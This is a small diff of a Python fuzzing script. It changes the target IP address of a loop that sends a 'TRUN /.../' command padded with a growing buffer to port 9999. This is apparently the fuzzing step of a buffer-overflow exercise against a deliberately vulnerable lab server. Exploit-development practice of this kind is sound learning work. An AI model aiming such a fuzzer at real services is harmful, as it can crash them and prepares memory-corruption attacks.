@@ -30,7 +30,7 @@ while True:
     try:    
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
-        s.connect(('10.0.2.29',9999))
+        s.connect(('192.168.1.102',9999))
         payload = "TRUN /.../" + buffer
         s.send((payload.encode()))
         print ("Fuzzing with %s bytes" % str(len(buffer)))
